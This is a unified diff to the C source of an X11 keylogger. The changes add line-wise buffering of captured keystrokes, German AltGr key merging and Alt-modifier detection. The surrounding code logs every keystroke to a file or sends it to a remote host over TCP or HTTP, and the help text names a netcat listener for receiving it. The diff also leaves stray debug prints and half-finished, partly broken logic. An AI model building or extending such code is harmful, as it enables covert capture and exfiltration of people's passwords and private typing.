@@ -16,6 +16,7 @@
 #include <signal.h>      /* signal() */
 #include <unistd.h>      /* getopt() */
 #include <ctype.h>       /* toupper() */
+#include <alloca.h>      /* alloca() */
 
 #include <sys/types.h>   /* time_t */
 #include <sys/stat.h>    /* umask() */
@@ -52,6 +53,7 @@ static int verbosity = 1;
 /* flags set via signal handler */
 static int flag_exit = 0;
 static int flag_flush = 0;
+static int flag_uselinebuf = 0;
 
 /* Here we go. */
 int main (int argc, char ** argv) {
@@ -98,8 +100,13 @@ int main (int argc, char ** argv) {
 		for( i = 0; i < XKBD_WIDTH * BITS_PER_BYTE; i++ )
 			if(getbit(kbd, i) != getbit(tmp, i) && getbit(kbd, i)) {
 				keystroke = decodeKey(i, getbit(kbd, i), getMods(kbd));
-				log( 1, config.logfd, "%s", keystroke);
-				fflush(config.logfd);
+
+				/* Log & flush every stroke, unless -l is specified */
+				if(!flag_uselinebuf) {
+					log( 1, config.logfd, "%s", keystroke);
+					fflush(config.logfd);
+				} else
+					linebuf_update((const char*)keystroke, &config);
 
 				if(config.log_remote_inet)
 					transmit_keystroke_inet(keystroke, &config);
@@ -111,9 +118,86 @@ int main (int argc, char ** argv) {
 	}
 }
 
+
+
+int linebuf_update(const char* s, struct config_struct* config){
+	/* If buffer is too small, allocate another chunk of memory */
+	if( strlen(s) + strlen(linebuf.buf) + 1 >= linebuf.size ) {
+		linebuf.size += LINEBUF_INC_LEN * sizeof(char);
+		linebuf.buf = realloc(linebuf.buf, linebuf.size);
+		if(linebuf.buf == NULL)
+			fatal("Unable to allocate memory");
+	}
+
+	/* Concat */
+	strncat(linebuf.buf, s, strlen(s));
+
+	/* If key is <ENTER>, flush & truncate line buffer */
+	if(strcmp("\n", s) == 0){
+		log( 1, config->logfd, "%s", linebuf.buf);
+		//log( 1, config->logfd, "\n");
+		fflush(config->logfd);
+
+		linebuf.buf[0] = 0;
+		return 1;
+	};
+
+	// TODO: make this work
+	/* If key is <BACKSPACE>, try to delete last keystroke */
+	//if(strcmp("\b", s) == 0 || strcmp("←", s) == 0){
+	char tmp = s[0];
+	printf("asdfasfd c = <%c>\n", tmp);
+	//if('\b' == tmp || '←' == tmp){
+	if(strncmp("←", s, 1) == 0){
+		printf("LOLOL\n");
+		linebuf.buf[strlen(linebuf.buf)-1] = 0;
+	};
+	
+
+
+	/* Fix for AltGr-key combinations on german keyboards */
+	/*
+	merge_split_keys('q', VIS_PREFIX_ALTGR, '@');
+	merge_split_keys('1', VIS_PREFIX_ALTGR, '¹');
+	merge_split_keys('2', VIS_PREFIX_ALTGR, '²');
+	merge_split_keys('3', VIS_PREFIX_ALTGR, '³');
+	merge_split_keys('4', VIS_PREFIX_ALTGR, '¼');
+	merge_split_keys('5', VIS_PREFIX_ALTGR, '½');
+	merge_split_keys('6', VIS_PREFIX_ALTGR, '¬');
+	merge_split_keys('7', VIS_PREFIX_ALTGR, '{');
+	merge_split_keys('8', VIS_PREFIX_ALTGR, '[');
+	merge_split_keys('9', VIS_PREFIX_ALTGR, ']');
+	merge_split_keys('0', VIS_PREFIX_ALTGR, '}');
+	merge_split_keys('ß', VIS_PREFIX_ALTGR, '\\');
+	*/
+
+	for(int i = 0; kbd_layout_ger[i].cur; i++){
+		merge_split_keys(kbd_layout_ger[i].cur, kbd_layout_ger[i].mod, kbd_layout_ger[i].replacement);
+	}
+
+	return 0;
+}
+
+
+void merge_split_keys(char key, const char mod, const char replacement){
+	int cur_key_idx = strlen(linebuf.buf) - 1;
+
+	if( linebuf.buf[cur_key_idx] == key &&
+		linebuf.buf[cur_key_idx-1] == mod){
+
+		linebuf.buf[cur_key_idx-1] = replacement;
+		linebuf.buf[cur_key_idx] = 0;
+	}
+}
+
+
+
 struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 	int c, i, j;
 	time_t rawtime;
+
+	linebuf.buf = smalloc(sizeof(char) * LINEBUF_INC_LEN);
+	linebuf.size = LINEBUF_INC_LEN * sizeof(char);
 
 	/* connect signals to handler-functions */
 	signal(SIGTERM, signal_handler);
@@ -139,7 +223,7 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 	config->log_remote_http_post = 0;
 
 	/* parse cmdline arguments */
-	while((c = getopt(argc, argv, "PO:s:f:H:h:?r:qdo")) != -1){
+	while((c = getopt(argc, argv, "PO:s:f:lH:h:?r:qdo")) != -1){
 		switch(c) {
 		  case 's':
 			if(strcmp(optarg, X_DEFAULT_DISPLAY) == 0)
@@ -147,6 +231,9 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 
 			config->display = smalloc(sizeof(char) * strlen(optarg) + 1);
 			strncpy(config->display, optarg, strlen(optarg));
+			break;
+		  case 'l':
+			flag_uselinebuf = 1;
 			break;
 		  case 'f':
 			config->logfile = smalloc(sizeof(char) * strlen(optarg) + 1);
@@ -188,6 +275,7 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 			log(0, stderr, "   -s <DISPLAY>    X-Display to use, default is :0.0\n");
 			log(0, stderr, "   -f <LOGFILE>    Log keystrokes to file instead of STDOUT. Text is\n");
 			log(0, stderr, "                   appended, logfile created if it does not exist.\n");
+			log(0, stderr, "   -l              Use smart line-wise buffering. See manpage for details.\n");
 			log(0, stderr, "   -r <HOST:PORT>  Log keystrokes to remote host. The other end needs a\n");
 			log(0, stderr, "                   program listening on the specified TCP port (e.g. using\n");
 			log(0, stderr, "                   BSD netcat: 'nc -p <port> -k')\n");
@@ -262,7 +350,7 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 
 char* decodeKey(int code, int down, int mod) {
 	static char *str, keystroke_readable[MAX_KEYLEN + 1];
-	int i = 0, remapChar = 0;
+	int i = 0;//, remapChar = 0;
 	KeySym sym;
 
 	sym = XKeycodeToKeysym(dsp, code, (mod == SHIFT_DOWN) ? True : False);
@@ -279,25 +367,34 @@ char* decodeKey(int code, int down, int mod) {
 	while (remap[i].src[0]) {
 		if (strstr(keystroke_readable, remap[i].src)) {
 			strcpy(keystroke_readable, remap[i].dst);
-			remapChar = 1;
+			//remapChar = 1;
 			break;
 		}
 		i++;
 	}
 
 	/* no remapping, but "long" keysym */
+	/*
 	if(keystroke_readable[1] && !remapChar) {
 		(down)
 			? sprintf(keystroke_readable, "%s%s%s", "[+", str, "]")
 			: sprintf(keystroke_readable, "%s%s%s", "[-", str, "]");
 		return keystroke_readable;
 	}
+	*/
 
+	/*
 	if(mod == CONTROL_DOWN) 
-		sprintf(keystroke_readable, "%c%c%c", '^', keystroke_readable[0], '\0');
+		printf("[C-DOWN]");
+		//sprintf(keystroke_readable, "%c%c%c", '^', keystroke_readable[0], '\0');
+
+	if(mod == ALT_DOWN) 
+		//sprintf(keystroke_readable, "%c%c%c", '+', keystroke_readable[0], '\0');
 
 	if(mod == LOCK_DOWN) 
-		keystroke_readable[0] = toupper(keystroke_readable[0]);
+		printf("[L-DOWN]");
+		//keystroke_readable[0] = toupper(keystroke_readable[0]);
+	*/
 
 	return keystroke_readable;
 }
@@ -318,6 +415,10 @@ int getMods(char *kbd) {
 		kc = map->modifiermap[LockMapIndex * map->max_keypermod + i];
 		if(kc && getbit(kbd, kc))
 			return LOCK_DOWN;
+
+		kc = map->modifiermap[Mod1MapIndex * map->max_keypermod + i];
+		if(kc && getbit(kbd, kc))
+			return ALT_DOWN;
 	}
 
 	return 0;
@@ -492,6 +593,7 @@ void* smalloc(size_t size) {
 
 	return ptr;
 }
+
 
 #ifdef _HAVE_CURL
 size_t curl_blackhole(void* unused, size_t size, size_t nmemb, void* none) {
